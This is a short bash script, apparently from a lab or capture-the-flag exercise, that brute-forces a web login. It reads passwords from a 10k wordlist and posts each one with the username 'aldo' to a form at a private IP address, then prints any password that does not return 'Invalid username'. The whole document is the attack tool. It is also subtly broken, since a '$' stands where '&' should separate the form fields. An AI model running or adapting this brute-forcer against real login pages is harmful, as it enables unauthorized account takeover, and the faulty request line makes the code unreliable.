#!/bin/bash
cat 10k.txt | while read p; do
	curl -s -d "username=aldo$password=$p&login=Login" 'http://172.17.1.93/' | grep -qi "Invalid username" || echo "Password is $p"
	#echo $p
done
